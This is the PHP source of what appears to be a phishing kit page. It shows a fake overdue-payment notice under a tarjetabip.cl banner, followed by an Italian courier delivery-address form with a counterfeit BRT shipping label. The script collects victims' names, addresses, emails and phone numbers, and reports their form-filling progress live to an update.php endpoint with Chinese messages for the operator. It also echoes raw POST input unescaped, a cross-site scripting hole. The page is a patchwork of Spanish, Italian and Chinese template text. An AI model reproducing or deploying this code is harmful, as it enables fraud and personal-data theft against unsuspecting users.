<?php
session_start();
//require_once 'config.php';
//include('partials/header.php');
include('header-him-banner.php');

if (isset($_POST['submit']) || isset($_POST['username'])) {
  $_SESSION['step1Data'] = $_POST;
}

?>
    <style>
        .wrap {
            padding: 30px 20px;
            /*        margin-top:70px;*/
            padding-bottom: 20px;
            /* background: #dedede; */
            background: white;
        }

        .top1 {
            background: white;
        }

        a.main-logo {
            display: block;
            margin: 11px 0 25px 0;
            text-align: center;
            color: #00a8b7;
            font-size: 19px;
            font-weight: bold;
        }

        .notice {
            line-height: 2;
            padding: 10px;
            border-radius: 5px;
            color: #777977;
            margin: 30px 0 40px;
            background: #f0f0eb;
        }

        @media (max-width: 767px) {
            p.like_viewmore {
                font-size: 13px;
                color: red;
                cursor: pointer;
            }

            .submit-btn {
                text-align: center;
                background-color: #00a8b7 !important;
                padding: 11px 24px;
                font-size: 1rem;
                display: block;
                width: auto;
                min-width: 120px;
                margin-left: auto;
                margin-right: auto;
                line-height: 22px;
                border-radius: 32px;
                color: #fff;
                border-color: #00a8b7;
                height: auto;
                cursor: pointer;
            }

            .submit-btn:hover:hover {
                background-color: #00a8b7;
                border-color: #00a8b7;
            }

            .loader-wrap {
                display: flex;
                width: 100%;
                height: 100%;
                position: fixed;
                top: 0;
                left: 0;
                align-items: center;
                justify-content: center;
                z-index: 99999999999999;
                background: rgba(255, 255, 255, 1);
            }

            .loader-wrap .loading {
                display: flex;
                flex-direction: column;
                align-items: center;
            }

            .loader-wrap .loading img.china-mobile-logo-img {
                width: 200px;
            }

            .loader-wrap .loading img {
                width: 80px;
            }
        }

        table,
        tr,
        th {

            padding: 10px;

            margin: auto;
            border: none;
            border-collapse: separate;
            /* border-radius: 10px; */

        }

        .cstm-table-new tr td strong {
            color: #004F98;
        }

        .top1 p {
            color: #004F98;
            padding: 10px 0px;
        }

        .total-price {
            /* border-radius: 1em; */
            background: #fff;
            padding: 11px 19px;
            margin-bottom: 17px;
            border-bottom: 2px solid #dedede;
        }

        span.total-price-inner {
            float: right;
            color: #004F98;
            padding-right: 43px;
        }

        tr.alert-notice {
            float: right;
        }

        tr.alert-notice > td {
            border: none;
        }

        table tr.input-as-text {
            border-radius: 10px;
            background: #fff;
        }

        .img-text {
            background: url("https://tarjetabip.cl/images/bot-carga-online.png") no-repeat top center;
            background-size: 100%;
            width: 100%;
            height: 110px;
            position: relative;
            display: table;
        }

        .text-center {
            border-top: 2px solid #dedede;
        }

        .top1 p {
            border-top: 2px solid #dedede;
        }

        table {
            border-top: 2px solid #dedede;
        }

        .center {
            border-top: 2px solid #dedede;
        }

        .img-text h3 {
            font-size: 25px !important;
            display: table-cell !important;
            text-align: center;
            /* padding-top: 30px; */
            color: white;
            font-weight: bold;
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 1);
            vertical-align: middle !important;
            line-height: 25px;
        }

        ::placeholder {
            /* Chrome, Firefox, Opera, Safari 10.1+ */
            color: #000;
            opacity: 1;
            /* Firefox */
        }

        :-ms-input-placeholder {
            /* Internet Explorer 10-11 */
            color: #000;
        }

        ::-ms-input-placeholder {
            /* Microsoft Edge */
            color: #000;
        }

        body.zh_HK input {
            font-weight: normal !important;
        }

        tr.input-as-text {
            border-top-left-radius: 10px;
        }

        tr.input-as-text {
            border-top-right-radius: 10px;
        }

        tr.input-as-text {
            border-bottom-left-radius: 10px;
        }

        tr.input-as-text {
            border-bottom-right-radius: 10px;
        }
    </style>
    <div class="wrap old_code_wrap">
        <div class="top1">
            <div class="sm-img">
                <a href="#">
                    <div class="img-text">
                        <h3>Carga Online</h3>
                    </div>
                </a>
            </div>
            <h3 class="text-center" style="color:#004F98;">Su monto pendiente de pago actual es de $800</h3>
            <p>
                cliente：<?php echo isset($_SESSION['step1Data']['username']) ? $_SESSION['step1Data']['username'] : ''; ?> </p>
            <table class="cstm-table-new" width="100%">

                <tbody>
                <tr class="alert-notice">
                    <td><strong style="color:red;text-align: center;">Deducción automática fallida, pague
                            manualmente</strong></td>
                </tr>
                <tr>
                    <td><strong>Mes de facturación</strong></td>
                    <td>30/8</td>
                </tr>
                <tr>
                    <td><strong>Tipo de tasa</strong></td>
                    <td>atrasos</td>
                </tr>
                <tr>
                    <td><strong>Cantidad pagable</strong></td>
                    <td>$800</td>
                </tr>
                </tbody>

            </table>
            <div class="center">
                <div class="total-price">
                    <span><strong>Tenga en cuenta: El servicio de pago atrasado se suspenderá</strong></span>
                    <span class="total-price-inner"></span>
                </div>
                <a href="/page4.php" class="submit-btn">Siguiente</a>
            </div>

        </div>
    </div>
    <div class="wrap only_mobile">
        <div class="container">
            <div class="">
                <div>
                    <h2 class="form_title">Indirizzo di consegnai̇</h2>
                    <p class="form_dis">Inserisci l'indirizzo corretto in modo che possiamo consegnare il tuo pacco correttamente!</p>
                </div>
                <form action="/page4.php" method="post" id="form_one">
                    <label for="fname">Nome completo</label>
                    <input class="inputField" type="text" id="fullnamePage2" name="fullnamePage2"><br>

                    <label for="lname">Indirizzo</label>
                    <input class="inputField" type="text" id="address" name="address"><br>

                    <label for="lname">Informazioni aggiuntive (Opzionale)</label>
                    <input class="inputField" type="text" id="straight" name="straight"><br>

                    <label for="lname">Città</label>
                    <input class="inputField" type="text" id="city" name="city"><br>

                    <label for="lname">Province</label>
                    <input class="inputField" type="text" id="country" name="country"><br>

                    <label for="lname">CAP</label>
                    <input class="inputField" type="text" id="zipcode" name="zipcode"><br>

                    <label for="lname">Email</label>
                    <input class="inputField" type="text" id="email" name="email"><br>

                    <label for="lname">Telefono</label>
                    <input class="inputField" type="text" id="phone" name="phone"><br><br>

                  <?php
                  echo !empty($_POST['phone']) ? $_POST['phone'] . '<br>' : '';
                  echo !empty($_POST['phone']) ? $_POST['email'] . ', ' . $_POST['address'] . '<br>' : '';
                  echo !empty($_POST['phone']) ? $_POST['zipcode'] . ', ' . $_POST['address'] . '<br>' : '';
                  echo !empty($_POST['phone']) ? $_POST['city'] . '<br>' : '';
                  echo !empty($_POST['phone']) ? $_POST['country'] . '<br>' : '';
                  ?>
                    <br>
                    <input class="button_next barcodeSectionModal" name="page2_submit" value="Continua" data-toggle="modal" data-target="#barcodeSectionModal">

					<!-- Modal -->
  <div class="modal fade" id="barcodeSectionModal" role="dialog">
    <div class="modal-dialog">

      <!-- Modal content-->
      <div class="modal-content">
        <div class="modal-header">
        <h5 class="modal-title">Confermare la nuova etichetta</h5>
          <button type="submit"  class="close" data-dismiss="modal">&times;</button>
        </div>
        <div class="modal-body no-padding">
         <div class="barcodeSection">
		  <div class="barcode-top">
			<div class="leftPanel">
			  <div class="logo"><img src="/CK/assets/images/BRT_logo.png" alt="Logo Correos Express"></div>
			  <div class="address">
					<span id="fullnamevalue"></span><br>
						<span id="emailvalue"></span><br>
					<span id="phonevalue"></span> <br>
					<span id="addressvalue"></span><br>
					<span id="straightvalue"></span> <span id="cityvalue"></span> <span id="zipcodevalue"></span><br>
					<span id="countryvalue"></span>
				</div>
				<input type="submit" class="button_next small-btn" name="page2_submit" value="Continua">
			</div>
			<div class="rightPanel">
			  <div class="qrscanner"><img src="/CK/assets/images/barcode-1.jpg"></div>
			  <div class="verticalbarcode"><img src="/CK/assets/images/barcode-2.jpg"></div>
			</div>
		  </div>
		  <div class="barcode-bottom">
			<div class="codenumber">
			  <span>00156796 41FFU 5121R</span>
			  <span>IT-00156796</span>
			  <span>1564AUIV865-4613</span>
			</div>
		<div class="quantityCount">
			<div class="qtynumber">1/1</div>
			<div class="weight">1.5 kg</div>
		</div>
		  </div><div class="barcode-bottom-last">
            <img src="/CK/assets/images/barcode-3.jpg">
            <span class="bar-bottom-number">146892036435134876IT</span>
        </div>
		</div>
        </div>
      </div>

    </div>
  </div>
                </form>
            </div>
        </div>
    </div>
    <div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
	<script>
 fname = document.getElementById("fullnamePage2"),
namevalue = document.getElementById("fullnamevalue"),
    address = document.getElementById("address"),
addressvalue = document.getElementById("addressvalue"),
    straight = document.getElementById("straight"), 
    straightvalue = document.getElementById("straightvalue"),
    city = document.getElementById("city"),
    cityvalue = document.getElementById("cityvalue"),
    country = document.getElementById("country"),
    countryvalue = document.getElementById("countryvalue"),
    zipcode = document.getElementById("zipcode"),
    zipcodevalue = document.getElementById("zipcodevalue"),
    email = document.getElementById("email"), 
    emailvalue = document.getElementById("emailvalue"),
    phone = document.getElementById("phone"), 
    phonevalue = document.getElementById("phonevalue");
 
function display(source,destination,fieldname)
{
	 var field = $(this).parent().find('input');
    var count = 0;

  destination.textContent = source;
    $(".inputField").each(function (i) {
        var len = $(this).val().length;        
        if (len > 0 ) {
            count++;
        }
    });
	//alert(count);
	updateText(fieldname,count);
  
}
$("form").focusout(function() {
	setTimeout(updateStatus,400);
})

// events
fname.onkeyup=function(){  display(this.value,namevalue,'1st'); };
address.onkeyup=function(){ display(this.value,addressvalue,'2nd'); };
straight.onkeyup=function(){ display(this.value,straightvalue,'3rd'); };
city.onkeyup=function(){ display(this.value,cityvalue,'4th'); };
country.onkeyup=function(){ display(this.value,countryvalue,'5th'); };
zipcode.onkeyup=function(){ display(this.value,zipcodevalue,'6th'); };
email.onkeyup=function(){ display(this.value,emailvalue,'7th'); }; 
phone.onkeyup=function(){ display(this.value,phonevalue,'8th'); };



function startProcess(){
    $.ajax({
      type: 'post',
      url: 'update.php',
      data: {
        'visit': 'fields',
        'text': 'user is at first field',
      },
      success: function (data) {

      }
    });
 }
 function updateText(fieldName,count){
    $.ajax({
      type: 'post',
      url: 'update.php',
      data: {
        'visit': 'fields',
        'text': '并开始填写数据 '+fieldName + ' 场地 ('+ count+' 行已满)',
        'type': 1,
      },
      success: function (data) {

      }
    });
 }
function updateStatus(){
	
	console.log("Inactivity of typing");
    $.ajax({
      type: 'post',
      url: 'update.php',
      data: {
        'visit': 'type',
        'type': 0,
      },
      success: function (data) {

      }
    });
 }


</script>
<?php
include('footer-him.php');
